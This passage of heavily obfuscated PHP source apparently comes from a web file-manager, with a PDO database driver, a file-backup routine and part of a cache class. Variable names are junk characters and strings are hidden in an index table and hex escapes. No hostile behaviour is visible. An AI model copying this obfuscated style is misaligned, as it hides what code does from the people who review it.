array_walk($ùØ†š„ã, array($this, $ÑûÀ¸„Ï[994])); $ãú“òƒ = $÷çÀ¡èª ? $ÑûÀ¸„Ï[995] : $ÑûÀ¸„Ï[996]; $¶°Şğã = $ãú“òƒ . $ÑûÀ¸„Ï[997] . $this->parseTable($îÈ¢‡İ[$ÑûÀ¸„Ï[359]]) . $ÑûÀ¸„Ï[991] . implode($ÑûÀ¸„Ï[50], $ùØ†š„ã) . $ÑûÀ¸„Ï[998] . implode($ÑûÀ¸„Ï[50], $¶¸Óµ“¥); return $this->execute($¶°Şğã); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $§ÆÛ¯€Ë =& $_SERVER[ùèÅ´Ãš]; $this->error = $this->_linkID->errno . $§ÆÛ¯€Ë[4] . $this->_linkID->error; if ($§ÆÛ¯€Ë[12] != $this->queryStr) { $this->error .= LNG($§ÆÛ¯€Ë[48]) . $this->queryStr; } think_trace($this->error, $§ÆÛ¯€Ë[12], $§ÆÛ¯€Ë[49]); return $this->error; } public function escapeString($ˆõù³£Ğ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ˆõù³£Ğ); } else { return addslashes($ˆõù³£Ğ); } } public function parseKey(&$æ‹ó¨Ğ…, $¹ì¤õ¢À = true) { $œø÷Úö­ =& $_SERVER[ùèÅ´Ãš]; if ($¹ì¤õ¢À) { $æ‹ó¨Ğ… = $this->parseKeyCheck($æ‹ó¨Ğ…); } if ($æ‹ó¨Ğ… != $œø÷Úö­[223] && !preg_match($œø÷Úö­[999], $æ‹ó¨Ğ…)) { $æ‹ó¨Ğ… = $œø÷Úö­[463] . trim($æ‹ó¨Ğ…, $œø÷Úö­[463]) . $œø÷Úö­[463]; } return $æ‹ó¨Ğ…; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ä¶—¿è = '') { $í‡Ÿ’éó =& $_SERVER[ùèÅ´Ãš]; if (!class_exists($í‡Ÿ’éó[1002])) { think_exception(think_lang($í‡Ÿ’éó[14]) . $í‡Ÿ’éó[1003]); } if (!empty($Ä¶—¿è)) { $this->config = $Ä¶—¿è; if (empty($this->config[$í‡Ÿ’éó[17]])) { $this->config[$í‡Ÿ’éó[17]] = array(); } } } public function connect($˜ŠşÄ’õ = '', $½ŠÉœü = 0) { $Ç¿”€Š  =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->linkID[$½ŠÉœü])) { if (empty($˜ŠşÄ’õ)) { $˜ŠşÄ’õ = $this->config; } $À¦ÔÃ“ = !empty($˜ŠşÄ’õ[$Ç¿”€Š [17]][$Ç¿”€Š [18]]) ? $˜ŠşÄ’õ[$Ç¿”€Š [17]][$Ç¿”€Š [18]] : $this->pconnect; if ($À¦ÔÃ“) { $˜ŠşÄ’õ[$Ç¿”€Š [17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$½ŠÉœü] = new PDO($˜ŠşÄ’õ[$Ç¿”€Š [1004]], $˜ŠşÄ’õ[$Ç¿”€Š [976]], $˜ŠşÄ’õ[$Ç¿”€Š [977]], $˜ŠşÄ’õ[$Ç¿”€Š [17]]); } catch (PDOException $Õ»’ÛáÊ) { think_exception($Õ»’ÛáÊ->getMessage()); } $this->dbType = $this->_getDsnType($˜ŠşÄ’õ[$Ç¿”€Š [1004]]); if (in_array($this->dbType, array($Ç¿”€Š [1005], $Ç¿”€Š [1006], $Ç¿”€Š [1007], $Ç¿”€Š [1008]))) { think_exception($Ç¿”€Š [1009] . $this->dbType . $Ç¿”€Š [1010] . $this->dbType . $Ç¿”€Š [1011]); } if (!$this->linkID[$½ŠÉœü]) { think_exception($Ç¿”€Š [1012]); } try { $this->linkID[$½ŠÉœü]->exec($Ç¿”€Š [1013] . think_config($Ç¿”€Š [979])); } catch (Exception $Õ»’ÛáÊ) { } $this->connected = !0; if (1 != think_config($Ç¿”€Š [22])) { unset($this->config); } } return $this->linkID[$½ŠÉœü]; } public function free() { $this->PDOStatement = null; } public function query($ÓûÙÌÃÕ, $Æ™…²ßÓ = array()) { $É¤ñ§Øô =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÓûÙÌÃÕ; if (!empty($Æ™…²ßÓ)) { $this->queryStr .= $É¤ñ§Øô[1014] . print_r($Æ™…²ßÓ, !0) . $É¤ñ§Øô[1015]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($É¤ñ§Øô[23], 1); think_status($É¤ñ§Øô[24]); $this->PDOStatement = $this->_linkID->prepare($ÓûÙÌÃÕ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ø¶ĞàÂ = $this->PDOStatement->execute($Æ™…²ßÓ); $this->debug(); if (!1 === $Ø¶ĞàÂ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($…úÀÄĞÆ, $€âİÅ¡Ø = array()) { $¹‡ç™õ” =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…úÀÄĞÆ; if (!empty($€âİÅ¡Ø)) { $this->queryStr .= $¹‡ç™õ”[1014] . print_r($€âİÅ¡Ø, !0) . $¹‡ç™õ”[1015]; } $¹û”Çç = !1; if ($this->dbType == $¹‡ç™õ”[1008]) { if (preg_match($¹‡ç™õ”[1016], $this->queryStr, $İĞ¢Çşİ)) { $this->table = think_config($¹‡ç™õ”[1017]) . str_ireplace(think_config($¹‡ç™õ”[1018]), $¹‡ç™õ”[456], $İĞ¢Çşİ[2]); $¹û”Çç = (bool) $this->query($¹‡ç™õ”[1019] . strtoupper($this->table) . $¹‡ç™õ”[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹‡ç™õ”[25], 1); think_status($¹‡ç™õ”[24]); $this->PDOStatement = $this->_linkID->prepare($…úÀÄĞÆ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $•¯Ñ×€÷ = $this->PDOStatement->execute($€âİÅ¡Ø); $this->debug(); if (!1 === $•¯Ñ×€÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¹û”Çç || preg_match($¹‡ç™õ”[1020], $…úÀÄĞÆ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»ñ‹ªã¦ = $this->_linkID->commit(); $this->transTimes = 0; if (!$»ñ‹ªã¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚŞĞÕ¿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÚŞĞÕ¿) { $this->error(); return !1; } } return !0; } private function getAll() { $…¹•¥›û = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($…¹•¥›û); return $…¹•¥›û; } public function getFields($ÜÓ†ïˆâ) { $‹Åš ©¶ =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (think_config($‹Åš ©¶[1021])) { $‚ÚÆ©‹Ù = str_replace($‹Åš ©¶[1022], $ÜÓ†ïˆâ, think_config($‹Åš ©¶[1021])); } else { switch ($this->dbType) { case $‹Åš ©¶[1005]: case $‹Åš ©¶[1023]: $‚ÚÆ©‹Ù = "\x53\x45\x4c\x45\103\124\x20\40\x20\143\157\x6c\x75\155\156\x5f\156\141\x6d\145\40\141\x73\x20\x27\x4e\x61\155\145\x27\x2c\40\x20\x20\x64\141\164\141\137\x74\x79\x70\x65\40\x61\x73\x20\x27\124\x79\x70\x65\47\x2c\x20\40\40\x63\157\x6c\x75\155\156\x5f\x64\145\146\x61\x75\x6c\164\x20\141\x73\x20\47\x44\145\146\141\x75\154\164\47\x2c\40\x20\40\x69\x73\137\156\165\154\154\x61\x62\x6c\x65\x20\141\163\40\47\116\x75\154\x6c\x27\12\x9\11\106\x52\117\115\x9\x69\x6e\146\x6f\x72\155\141\164\151\157\156\x5f\x73\x63\150\145\155\x61\x2e\x74\141\142\154\x65\163\40\101\123\40\x74\12\11\x9\x4a\117\111\116\x9\151\156\146\x6f\x72\x6d\141\x74\x69\157\x6e\x5f\x73\143\x68\145\155\141\56\x63\157\x6c\165\155\x6e\x73\40\101\x53\x20\143\xa\11\11\x4f\116\x20\x20\x74\56\164\x61\x62\x6c\145\137\143\x61\x74\141\x6c\157\147\40\75\40\x63\56\x74\x61\142\x6c\145\x5f\x63\x61\164\x61\154\x6f\x67\12\x9\11\101\116\104\x20\164\x2e\x74\141\142\x6c\145\x5f\163\143\150\145\x6d\x61\x20\75\x20\143\56\164\x61\x62\154\x65\137\163\x63\x68\145\x6d\141\xa\11\x9\x41\116\104\40\164\x2e\164\141\142\154\145\x5f\156\x61\155\x65\40\75\40\143\x2e\x74\141\x62\x6c\x65\137\x6e\x61\155\145\12\11\11\127\110\105\x52\x45\x20\40\x20\x74\x2e\164\x61\x62\154\145\137\x6e\141\155\145\40\x3d\40\x27{$ÜÓ†ïˆâ}\x27"; break; case $‹Åš ©¶[1024]: $‚ÚÆ©‹Ù = $‹Åš ©¶[1025] . $ÜÓ†ïˆâ . $‹Åš ©¶[1026]; break; case $‹Åš ©¶[1006]: case $‹Åš ©¶[1008]: $‚ÚÆ©‹Ù = $‹Åš ©¶[1027] . $‹Åš ©¶[1028] . $‹Åš ©¶[1029] . strtoupper($ÜÓ†ïˆâ) . $‹Åš ©¶[1030] . strtoupper($ÜÓ†ïˆâ) . $‹Åš ©¶[1031]; break; case $‹Åš ©¶[1032]: $‚ÚÆ©‹Ù = $‹Åš ©¶[1033] . $ÜÓ†ïˆâ . $‹Åš ©¶[1034]; break; case $‹Åš ©¶[1007]: break; case $‹Åš ©¶[1035]: default: $‚ÚÆ©‹Ù = $‹Åš ©¶[1036] . ($this->dbType == $‹Åš ©¶[1035] ? "\x60{$ÜÓ†ïˆâ}\140" : $ÜÓ†ïˆâ); } } $º®¹¨şÆ = $this->query($‚ÚÆ©‹Ù); $¤ª¤è¬ó = array(); if ($º®¹¨şÆ) { foreach ($º®¹¨şÆ as $áñıÕ˜ƒ => $Óòí½¾¶) { $Óòí½¾¶ = array_change_key_case($Óòí½¾¶); $Óòí½¾¶[$‹Åš ©¶[32]] = isset($Óòí½¾¶[$‹Åš ©¶[32]]) ? $Óòí½¾¶[$‹Åš ©¶[32]] : $‹Åš ©¶[456]; $Óòí½¾¶[$‹Åš ©¶[33]] = isset($Óòí½¾¶[$‹Åš ©¶[33]]) ? $Óòí½¾¶[$‹Åš ©¶[33]] : $‹Åš ©¶[456]; $«æğ—–“ = isset($Óòí½¾¶[$‹Åš ©¶[353]]) ? $Óòí½¾¶[$‹Åš ©¶[353]] : $Óòí½¾¶[$‹Åš ©¶[32]]; $¤ª¤è¬ó[$«æğ—–“] = array($‹Åš ©¶[32] => $«æğ—–“, $‹Åš ©¶[33] => $Óòí½¾¶[$‹Åš ©¶[33]], $‹Åš ©¶[35] => (bool) (isset($Óòí½¾¶[$‹Åš ©¶[106]]) && $Óòí½¾¶[$‹Åš ©¶[106]] === $‹Åš ©¶[12] || isset($Óòí½¾¶[$‹Åš ©¶[35]]) && $Óòí½¾¶[$‹Åš ©¶[35]] === $‹Åš ©¶[12]), $‹Åš ©¶[37] => isset($Óòí½¾¶[$‹Åš ©¶[37]]) ? $Óòí½¾¶[$‹Åš ©¶[37]] : (isset($Óòí½¾¶[$‹Åš ©¶[56]]) ? $Óòí½¾¶[$‹Åš ©¶[56]] : $‹Åš ©¶[456]), $‹Åš ©¶[39] => isset($Óòí½¾¶[$‹Åš ©¶[97]]) ? strtolower($Óòí½¾¶[$‹Åš ©¶[97]]) == $‹Åš ©¶[41] : (isset($Óòí½¾¶[$‹Åš ©¶[57]]) ? $Óòí½¾¶[$‹Åš ©¶[57]] : !1), $‹Åš ©¶[42] => isset($Óòí½¾¶[$‹Åš ©¶[1037]]) ? strtolower($Óòí½¾¶[$‹Åš ©¶[1037]]) == $‹Åš ©¶[44] : (isset($Óòí½¾¶[$‹Åš ©¶[97]]) ? $Óòí½¾¶[$‹Åš ©¶[97]] : !1)); } } return $¤ª¤è¬ó; } public function getTables($°ÊâÍ½¼ = '') { $œŞ­©¥í =& $_SERVER[ùèÅ´Ãš]; if (think_config($œŞ­©¥í[1038])) { $®öŞœßÄ = str_replace($œŞ­©¥í[1039], $°ÊâÍ½¼, think_config($œŞ­©¥í[1038])); } else { switch ($this->dbType) { case $œŞ­©¥í[1006]: case $œŞ­©¥í[1008]: $®öŞœßÄ = $œŞ­©¥í[1040]; break; case $œŞ­©¥í[1005]: case $œŞ­©¥í[1023]: $®öŞœßÄ = $œŞ­©¥í[1041]; break; case $œŞ­©¥í[1032]: $®öŞœßÄ = $œŞ­©¥í[1042]; break; case $œŞ­©¥í[1007]: think_exception(think_lang($œŞ­©¥í[1043]) . $œŞ­©¥í[1044]); break; case $œŞ­©¥í[1024]: $®öŞœßÄ = $œŞ­©¥í[45] . $œŞ­©¥í[46] . $œŞ­©¥í[47]; break; case $œŞ­©¥í[1035]: default: if (!empty($°ÊâÍ½¼)) { $®öŞœßÄ = $œŞ­©¥í[987] . $°ÊâÍ½¼ . $œŞ­©¥í[988]; } else { $®öŞœßÄ = $œŞ­©¥í[989]; } } } $ÉÜ£ßš = $this->query($®öŞœßÄ); $±Íäá­ı = array(); foreach ($ÉÜ£ßš as $şï²»¾³ => $£àŞé˜¹) { $±Íäá­ı[$şï²»¾³] = current($£àŞé˜¹); } return $±Íäá­ı; } protected function parseLimit($ÓÃ‹–¡Ñ) { $»µÏ¬Ó =& $_SERVER[ùèÅ´Ãš]; $½É«ñÙâ = $»µÏ¬Ó[12]; if (!empty($ÓÃ‹–¡Ñ)) { switch ($this->dbType) { case $»µÏ¬Ó[1032]: case $»µÏ¬Ó[1024]: $ÓÃ‹–¡Ñ = explode($»µÏ¬Ó[50], $ÓÃ‹–¡Ñ); if (count($ÓÃ‹–¡Ñ) > 1) { $½É«ñÙâ .= $»µÏ¬Ó[51] . $ÓÃ‹–¡Ñ[1] . $»µÏ¬Ó[52] . $ÓÃ‹–¡Ñ[0] . $»µÏ¬Ó[53]; } else { $½É«ñÙâ .= $»µÏ¬Ó[51] . $ÓÃ‹–¡Ñ[0] . $»µÏ¬Ó[53]; } break; case $»µÏ¬Ó[1005]: case $»µÏ¬Ó[1023]: break; case $»µÏ¬Ó[1007]: break; case $»µÏ¬Ó[1006]: case $»µÏ¬Ó[1008]: break; case $»µÏ¬Ó[1035]: default: $½É«ñÙâ .= $»µÏ¬Ó[51] . $ÓÃ‹–¡Ñ . $»µÏ¬Ó[53]; } } return $½É«ñÙâ; } public function parseKey(&$¾©à‰Á, $Õå½šŸ– = true) { $å‡°†˜‹ =& $_SERVER[ùèÅ´Ãš]; if ($Õå½šŸ–) { $¾©à‰Á = $this->parseKeyCheck($¾©à‰Á); } if ($this->dbType == $å‡°†˜‹[1035]) { if ($¾©à‰Á != $å‡°†˜‹[223] && !preg_match($å‡°†˜‹[999], $¾©à‰Á)) { $¾©à‰Á = $å‡°†˜‹[463] . trim($¾©à‰Á, $å‡°†˜‹[463]) . $å‡°†˜‹[463]; } return $¾©à‰Á; } else { return parent::parseKey($¾©à‰Á, $Õå½šŸ–); } } public function close() { $this->_linkID = null; } public function error() { $®“ñ¯İò =& $_SERVER[ùèÅ´Ãš]; if ($this->PDOStatement) { $çïá³Á = $this->PDOStatement->errorInfo(); $this->error = $çïá³Á[1] . $®“ñ¯İò[4] . $çïá³Á[2]; } else { $this->error = $®“ñ¯İò[12]; } if ($®“ñ¯İò[12] != $this->queryStr) { $this->error .= LNG($®“ñ¯İò[48]) . $this->queryStr; } think_trace($this->error, $®“ñ¯İò[12], $®“ñ¯İò[49]); return $this->error; } public function escapeString($ŸÉ„èùˆ) { $¥–µùõ¦ =& $_SERVER[ùèÅ´Ãš]; switch ($this->dbType) { case $¥–µùõ¦[1032]: case $¥–µùõ¦[1005]: case $¥–µùõ¦[1023]: case $¥–µùõ¦[1035]: return addslashes($ŸÉ„èùˆ); case $¥–µùõ¦[1007]: case $¥–µùõ¦[1024]: case $¥–µùõ¦[1006]: case $¥–µùõ¦[1008]: return str_ireplace($¥–µùõ¦[58], $¥–µùõ¦[59], $ŸÉ„èùˆ); } } protected function parseValue($ÏÀöšˆ ) { $öæ¬š¬ä =& $_SERVER[ùèÅ´Ãš]; if (is_string($ÏÀöšˆ )) { $Õ¯Ğ©’Ÿ = strpos($ÏÀöšˆ , $öæ¬š¬ä[4]) === 0 && in_array($ÏÀöšˆ , array_keys($this->bind)); $ÏÀöšˆ  = $Õ¯Ğ©’Ÿ ? $this->escapeString($ÏÀöšˆ ) : $öæ¬š¬ä[1045] . $this->escapeString($ÏÀöšˆ ) . $öæ¬š¬ä[1045]; } elseif (isset($ÏÀöšˆ [0]) && is_string($ÏÀöšˆ [0]) && strtolower($ÏÀöšˆ [0]) == $öæ¬š¬ä[374]) { $ÏÀöšˆ  = $this->escapeString($ÏÀöšˆ [1]); } elseif (is_array($ÏÀöšˆ )) { $ÏÀöšˆ  = array_map(array($this, $öæ¬š¬ä[1046]), $ÏÀöšˆ ); } elseif (is_bool($ÏÀöšˆ )) { $ÏÀöšˆ  = $ÏÀöšˆ  ? $öæ¬š¬ä[91] : $öæ¬š¬ä[231]; } elseif (is_null($ÏÀöšˆ )) { $ÏÀöšˆ  = $öæ¬š¬ä[106]; } return $ÏÀöšˆ ; } public function getLastInsertId() { $Éç¢Üš =& $_SERVER[ùèÅ´Ãš]; switch ($this->dbType) { case $Éç¢Üš[1032]: case $Éç¢Üš[1024]: case $Éç¢Üš[1005]: case $Éç¢Üš[1023]: case $Éç¢Üš[1007]: case $Éç¢Üš[1035]: return $this->_linkID->lastInsertId(); case $Éç¢Üš[1006]: case $Éç¢Üš[1008]: $§ÛšóŞ‹ = $this->table; $­‘Ñ¾ƒœ = $this->query("\123\105\x4c\x45\x43\124\40{$§ÛšóŞ‹}\56\x63\165\x72\162\x76\141\154\40\143\x75\x72\162\x76\141\x6c\x20\106\122\x4f\x4d\40\144\165\141\x6c"); return $­‘Ñ¾ƒœ ? $­‘Ñ¾ƒœ[0][$Éç¢Üš[1047]] : 0; } } } goto eäòÓ¾¯„Ô; b˜‹Î½‰‹: class BackupFile { public function __construct() { } public function index() { $İÅËáü = Backup::get(); $ŞšÓÛĞØ = $İÅËáü[$_SERVER[ùèÅ´Ãš][833]][$_SERVER[ùèÅ´Ãš][233]][$_SERVER[ùèÅ´Ãš][545]]; $ƒÉÕ÷Ÿ = array($_SERVER[ùèÅ´Ãš][546] => array($_SERVER[ùèÅ´Ãš][890], $ŞšÓÛĞØ), $_SERVER[ùèÅ´Ãš][891] => array($_SERVER[ùèÅ´Ãš][408], $İÅËáü[$_SERVER[ùèÅ´Ãš][829]])); $™Ùá£œ = (int) Model($_SERVER[ùèÅ´Ãš][869])->where($ƒÉÕ÷Ÿ)->count($_SERVER[ùèÅ´Ãš][545]); $»ªû‰Ÿ = (int) Model($_SERVER[ùèÅ´Ãš][869])->where($ƒÉÕ÷Ÿ)->sum($_SERVER[ùèÅ´Ãš][79]); $ÕÑ×½Ø = new TaskFileTransfer($_SERVER[ùèÅ´Ãš][892], $_SERVER[ùèÅ´Ãš][855], $™Ùá£œ, LNG($_SERVER[ùèÅ´Ãš][864]) . $_SERVER[ùèÅ´Ãš][865] . LNG($_SERVER[ùèÅ´Ãš][893])); $ÕÑ×½Ø->task[$_SERVER[ùèÅ´Ãš][841]] = $»ªû‰Ÿ; $şöåš…„ = array($_SERVER[ùèÅ´Ãš][894] => $™Ùá£œ, $_SERVER[ùèÅ´Ãš][895] => $»ªû‰Ÿ, $_SERVER[ùèÅ´Ãš][896] => time()); Backup::set($şöåš…„); $Í’¾‡‚À = !0; $”ÖüõŒ­ = $this->storeIds(); $‰ÈÈ‘‹˜ = 1; $şØŒ±º‘ = 1000; $ÖŸÎöùˆ = $»ñõóêÜ = 0; $ÑéÈá„¹ = array(); $ŞÑ†€ª… = $ø°¡²ò = 0; do { $ñ³ÔùĞ = $_SERVER[ùèÅ´Ãš][897]; $ñƒ«ËĞ° = Model($_SERVER[ùèÅ´Ãš][869])->where($ƒÉÕ÷Ÿ)->field($ñ³ÔùĞ)->order($_SERVER[ùèÅ´Ãš][898])->selectPage($şØŒ±º‘, $‰ÈÈ‘‹˜); $·Ó¿¸½ = !empty($ñƒ«ËĞ°[$_SERVER[ùèÅ´Ãš][447]]) ? $ñƒ«ËĞ°[$_SERVER[ùèÅ´Ãš][447]] : array(); foreach ($·Ó¿¸½ as $İÃÙÔ‚™) { if (!$this->_fileExist($İÃÙÔ‚™, $ÑéÈá„¹, $”ÖüõŒ­)) { Backup::log($_SERVER[ùèÅ´Ãš][899] . $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][545]] . $_SERVER[ùèÅ´Ãš][900] . $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][87]]); continue; } $Ù‡›ô¾ = $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][87]]; $©Æ¿½Àù = "\173\151\157\x3a{$İÅËáü[$_SERVER[ùèÅ´Ãš][829]]}\x7d" . substr($Ù‡›ô¾, strlen("\x7b\151\157\72{$İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][901]]}\x7d")); if (IO::exist($©Æ¿½Àù)) { $ÕÑ×½Ø->updateFileEnd($İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][32]], $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][79]]); } else { $©Æ¿½Àù = get_path_father($©Æ¿½Àù); IO::mkdir($©Æ¿½Àù); if (!IO::copy($Ù‡›ô¾, $©Æ¿½Àù, $_SERVER[ùèÅ´Ãš][902])) { Backup::log($_SERVER[ùèÅ´Ãš][903] . $Ù‡›ô¾ . $_SERVER[ùèÅ´Ãš][885] . $©Æ¿½Àù . $_SERVER[ùèÅ´Ãš][178]); $Í’¾‡‚À = !1; break; } } $ŞšÓÛĞØ = $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][545]]; $»ñõóêÜ += 1; $ÖŸÎöùˆ += $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][79]]; $ø°¡²ò += 1; $ŞÑ†€ª… += $İÃÙÔ‚™[$_SERVER[ùèÅ´Ãš][79]]; if ($ÖŸÎöùˆ >= 1024 * 1024 * 100) { $şöåš…„ = array($_SERVER[ùèÅ´Ãš][828] => $ŞšÓÛĞØ, $_SERVER[ùèÅ´Ãš][904] => $ø°¡²ò, $_SERVER[ùèÅ´Ãš][905] => $ŞÑ†€ª…); Backup::set($şöåš…„); $ÖŸÎöùˆ = $»ñõóêÜ = 0; } } $”Å¡ğá¢ = count($·Ó¿¸½); $‰ÈÈ‘‹˜++; } while ($”Å¡ğá¢ == $şØŒ±º‘); $ÕÑ×½Ø->end(); $şöåš…„ = array($_SERVER[ùèÅ´Ãš][906] => 1, $_SERVER[ùèÅ´Ãš][839] => time(), $_SERVER[ùèÅ´Ãš][853] => 1, $_SERVER[ùèÅ´Ãš][828] => $ŞšÓÛĞØ, $_SERVER[ùèÅ´Ãš][907] => time()); if ($»ñõóêÜ) { $şöåš…„[$_SERVER[ùèÅ´Ãš][904]] = $ø°¡²ò; $şöåš…„[$_SERVER[ùèÅ´Ãš][905]] = $ŞÑ†€ª…; } Backup::set($şöåš…„); return !0; } private function _fileExist($Á²ğ‚§¿, &$æÑÊà˜§, $ÕÜ¼‘à¢) { $¸Ç³¶¨„ =& $_SERVER[ùèÅ´Ãš]; $¢áÂàŠ = $Á²ğ‚§¿[$¸Ç³¶¨„[87]]; if (in_array($Á²ğ‚§¿[$¸Ç³¶¨„[545]], $æÑÊà˜§)) { return !1; } if (!in_array($Á²ğ‚§¿[$¸Ç³¶¨„[901]], $ÕÜ¼‘à¢)) { return !1; } if (IO::exist($¢áÂàŠ)) { return !0; } $­œã­Û = get_path_father($¢áÂàŠ); if (IO::exist($­œã­Û)) { $æÑÊà˜§[] = $Á²ğ‚§¿[$¸Ç³¶¨„[545]]; return !1; } $¿¼ÇşÅ¡ = array($¸Ç³¶¨„[901] => $Á²ğ‚§¿[$¸Ç³¶¨„[901]], $¸Ç³¶¨„[87] => array($¸Ç³¶¨„[461], "{$­œã­Û}\x25")); $âñûÜ®˜ = Model($¸Ç³¶¨„[869])->where($¿¼ÇşÅ¡)->field($¸Ç³¶¨„[546])->select(); $æÑÊà˜§ = array_merge($æÑÊà˜§, array_to_keyvalue($âñûÜ®˜, $¸Ç³¶¨„[12], $¸Ç³¶¨„[545])); return !1; } private function _fileFilter($¤öÓè¯Œ) { $Ì›µß‘º =& $_SERVER[ùèÅ´Ãš]; return; if (empty($¤öÓè¯Œ)) { return; } $Ñ¶óí– = array($Ì›µß‘º[545] => array($Ì›µß‘º[7], array_unique($¤öÓè¯Œ))); $™öâÅÛŸ = Model($Ì›µß‘º[908])->where($Ñ¶óí–)->field($Ì›µß‘º[194])->select(); foreach ($™öâÅÛŸ as $Óã…ë¯ˆ) { Model($Ì›µß‘º[908])->remove($Óã…ë¯ˆ[$Ì›µß‘º[194]], !1); } } private function storeIds() { $Ùß›šÂö =& $_SERVER[ùèÅ´Ãš]; $‡œßğÉÑ = Model($Ùß›šÂö[845])->listData(); $¹Æ…ºµË = array(); $à¤æ¡±Ì = $GLOBALS[$Ùß›šÂö[6]][$Ùß›šÂö[92]][$Ùß›šÂö[909]]; foreach ($‡œßğÉÑ as $‡êÃ­ùˆ) { $Æ‘¾’‡¶ = strtolower($‡êÃ­ùˆ[$Ùß›šÂö[98]]); if (!isset($à¤æ¡±Ì[$Æ‘¾’‡¶])) { continue; } $„õİ– = $Ùß›šÂö[77] . (isset($à¤æ¡±Ì[$Æ‘¾’‡¶]) ? $à¤æ¡±Ì[$Æ‘¾’‡¶] : ucfirst($Æ‘¾’‡¶)); if (!class_exists($„õİ–)) { continue; } $¹Æ…ºµË[] = $‡êÃ­ùˆ[$Ùß›šÂö[477]]; } return $¹Æ…ºµË; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $õãÅ¿¬í =& $_SERVER[ùèÅ´Ãš]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‰ø¬œ¨‡ = $GLOBALS[$õãÅ¿¬í[6]][$õãÅ¿¬í[426]]; $è©®°Òê = $‰ø¬œ¨‡[$‰ø¬œ¨‡[$õãÅ¿¬í[910]]]; $½Ş¿¬ƒá = $‰ø¬œ¨‡[$õãÅ¿¬í[911]]; switch ($‰ø¬œ¨‡[$õãÅ¿¬í[910]]) { case $õãÅ¿¬í[21]: self::$handle = Model($õãÅ¿¬í[912]); break; case $õãÅ¿¬í[913]: self::$handle = new CacheRedis($è©®°Òê, $½Ş¿¬ƒá); break; case $õãÅ¿¬í[914]: self::$handle = new CacheMemcached($è©®°Òê, $½Ş¿¬ƒá); break; case $õãÅ¿¬í[233]: self::$handle = new CacheFile($è©®°Òê, $½Ş¿¬ƒá); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($­–®ïğÀ) { if (is_array($­–®ïğÀ) || is_object($­–®ïğÀ)) { $­–®ïğÀ = json_encode($­–®ïğÀ); } $­–®ïğÀ = rawurlencode($­–®ïğÀ); return md5(KOD_SITE_ID . $_SERVER[ùèÅ´Ãš][11] . $­–®ïğÀ); } public static function get($‰Ò¿õ©Á, $½­¨»¾ = false) { $ŸÆâœ¢ = self::key($‰Ò¿õ©Á); $éñæÙ¡ = self::init(); if ($½­¨»¾) { return unserialize($éñæÙ¡->get($ŸÆâœ¢)); } if (!isset(self::$memoryCache[$ŸÆâœ¢])) { $åÊŠÎ¬ = $éñæÙ¡->get($ŸÆâœ¢); self::$memoryCache[$ŸÆâœ¢] = unserialize($åÊŠÎ¬); } return self::$memoryCache[$ŸÆâœ¢]; } public static function set($±¬ú„“¡, $ƒõîŸÀ, $ÍÅ¼„Ü = false) { $Îª¿ù—± =& $_SERVER[ùèÅ´Ãš]; $”ö°õÏ = self::key($±¬ú„“¡); if (isset(self::$memoryCache[$”ö°õÏ]) && self::$memoryCache[$”ö°õÏ] === $ƒõîŸÀ) { return !0; } if ($ÍÅ¼„Ü === 0) { self::$memoryCache[$”ö°õÏ] = $ƒõîŸÀ; return !0; } $šØ¸Ù ó = self::init(); $ñ»ßÓƒ = serialize($ƒõîŸÀ); CacheLock::lock($±¬ú„“¡ . $Îª¿ù—±[915]); $ƒ›¿Ÿ¤ò = $šØ¸Ù ó->set($”ö°õÏ, $ñ»ßÓƒ, $ÍÅ¼„Ü); self::$memoryCache[$”ö°õÏ] = $ƒõîŸÀ; CacheLock::unlock($±¬ú„“¡ . $Îª¿ù—±[915]); return $ƒ›¿Ÿ¤ò; } public static function getCall($òò’Î›•, $›óŠÊÇ¸, $óá‰†ôÏ, $êÍŒÍ‘ˆ = array()) { $Áôå«ÓŞ =& $_SERVER[ùèÅ´Ãš]; $¿¿ûè¾Ó = self::get($òò’Î›•); if ($¿¿ûè¾Ó || $¿¿ûè¾Ó === $Áôå«ÓŞ[12]) { return $¿¿ûè¾Ó; } $¿¿ûè¾Ó = call_user_func_array($óá‰†ôÏ, $êÍŒÍ‘ˆ); $¿¿ûè¾Ó = $¿¿ûè¾Ó ? $¿¿ûè¾Ó : $Áôå«ÓŞ[12]; self::set($òò’Î›•, $¿¿ûè¾Ó, $›óŠÊÇ¸); return $¿¿ûè¾Ó; } public static function remove($­ªóÁéí) { $‘¿ÔĞ¯ = self::key($­ªóÁéí); unset(self::$memoryCache[$‘¿ÔĞ¯]); self::clearTimeout(); CacheLock::lock($­ªóÁéí); 